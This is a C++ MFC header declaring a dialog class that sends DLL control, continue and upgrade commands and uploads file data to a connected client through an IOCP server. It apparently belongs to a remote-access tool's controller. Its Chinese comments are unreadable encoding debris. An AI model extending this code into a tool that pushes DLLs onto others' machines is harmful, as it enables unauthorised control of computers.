#if !defined(AFX_DLLDLG_H__1316DFC2_83E7_4AF9_91E7_B021AAEE5BA6__INCLUDED_)
#define AFX_DLLDLG_H__1316DFC2_83E7_4AF9_91E7_B021AAEE5BA6__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// DllDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CDllDlg dialog
enum
{
	COMMAND_DLL_CONTROL = 1,   //�ؼ�����
	COMMAND_DLL_CONTINUE,	   //�ؼ�����
	COMMAND_DLL_UPGRADE,       //�ؼ�����
};

class CDllDlg : public CDialog
{
// Construction
public:
	CDllDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
	void OnReceiveComplete();
	CString m_strOperatingFile; // �ļ���
	__int64 m_nOperatingFileLength; // �ļ��ܴ�С
	__int64	m_nCounter;// ������
	bool m_bIsStop;
	CString m_strOperatingPath;
	CListCtrl* m_pListCtrl;
	BOOL DLLdat;
//	LPBYTE lparam;
//	DWORD dwSizeofbuff;

// Dialog Data
	//{{AFX_DATA(CDllDlg)
	enum { IDD = IDD_DLLDLG };
	CProgressCtrl	m_dlldlg_progress;
		// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CDllDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:

//	void GetServerVersion();
	void ShowProgress();
	void SendFileData();
	void EndLocalUploadFile();
	BOOL SendUploadJob(CString m_FilePats);
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	// Generated message map functions
	//{{AFX_MSG(CDllDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnShowWindow(BOOL bShow, UINT nStatus);
//	afx_msg void TSDLLINUSE();
	afx_msg void OnDllClose();
	afx_msg void OnDllDataAgain();
	afx_msg void OnDllDataCont();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

#endif // !defined(AFX_DLLDLG_H__1316DFC2_83E7_4AF9_91E7_B021AAEE5BA6__INCLUDED_)
